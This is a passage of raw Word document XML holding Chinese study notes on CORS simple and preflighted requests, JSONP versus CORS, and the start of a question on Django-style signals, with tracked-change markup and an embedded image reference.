          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>等请求</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>则服务端需要设置允许某请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B088AA5"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如果复杂请求设置了请求头，则服务端需要设置允许某请求头</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11BBC991" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>简单请求：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C306942"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一次请求</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="184301EA" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>非简单请求：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DAD2813"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两次请求，在发送数据之前会先发一次请求用于做</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>预检</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56E75856"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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>只有</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>预检</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>通过后才再发送一次请求用于数据传输。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0434C99E" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="782754DD" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>只要同时满足以下两大条件，就属于简单请求。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17EF9168" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"># (1) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求方法是以下三种方法之一：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HEAD GET POST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CAA04A4" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t># (2)HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的头信息不超出以下几种字段：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">                                     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0180FAD2" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t># Accept                                     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C230BB3" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t># Accept-Language                                     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7784C1D2" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t># Content-Language</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B0C7AE4" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t># Last-Event-ID</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68D3625B" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t># Content-Type</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：只限于三个值</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>application/x-www-form-urlencoded</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>multipart/form-data</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> text/plain </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10711B9F" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>#JSONP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>CORS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E3D5F14" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t># 1.JSONP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>只能实现</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求，而</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>CORS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>支持所有类型的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73756492" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t># 2.jsonp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>需要</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>client</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>server</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>端的相互配合</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A01ADD" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t># 3.cors</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>client</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>端无需设置，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>server</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>端需要针对不同的请求，来做</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>head</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>头的处理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E338ACC" w14:textId="68B98EE6" w:rsidR="00717181" w:rsidRPr="00717181" w:rsidDel="00717181" w:rsidRDefault="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:del w:id="118" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:rPrChange w:id="119" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
            <w:rPr>
              <w:del w:id="120" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z"/>
              <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
              <w:color w:val="333333"/>
              <w:szCs w:val="21"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:pPrChange w:id="121" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
          <w:pPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:jc w:val="right"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:del w:id="122" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
        <w:r w:rsidRPr="00717181" w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:rPrChange w:id="123" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="333333"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00717181" w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:rPrChange w:id="124" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="333333"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delInstrText xml:space="preserve"> HYPERLINK "https://www.cnblogs.com/wenyule/p/9740926.html" \l "_labelTop" </w:delInstrText>
        </w:r>
        <w:r w:rsidRPr="00717181" w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:rPrChange w:id="125" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="333333"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00717181" w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:rPrChange w:id="126" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
              <w:rPr>
                <w:rStyle w:val="ab"/>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
                <w:color w:val="F68A33"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>反回顶部</w:delText>
        </w:r>
        <w:r w:rsidRPr="00717181" w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:rPrChange w:id="127" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="333333"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:bookmarkStart w:id="128" w:name="_label2-17"/>
        <w:bookmarkEnd w:id="128"/>
      </w:del>
    </w:p>
    <w:p w14:paraId="6A6066FC" w14:textId="42A808B2" w:rsidR="00717181" w:rsidRDefault="00B73D4C">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:pPrChange w:id="129" w:author="ABM ABM" w:date="2020-08-16T13:38:00Z">
          <w:pPr>
            <w:pStyle w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
            <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>019</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>信号的作用是什么？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F5BB834" w14:textId="45B272CC" w:rsidR="00717181" w:rsidRDefault="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:pPrChange w:id="130" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z">
          <w:pPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:noProof/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7577CAF6" wp14:editId="457C1EB2">
            <wp:extent cx="5715000" cy="14859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noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CB65086" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>保存前写日志</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="093BEFE9" w14:textId="4FC5383D" w:rsidR="00717181" w:rsidDel="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="right"/>
        <w:rPr>
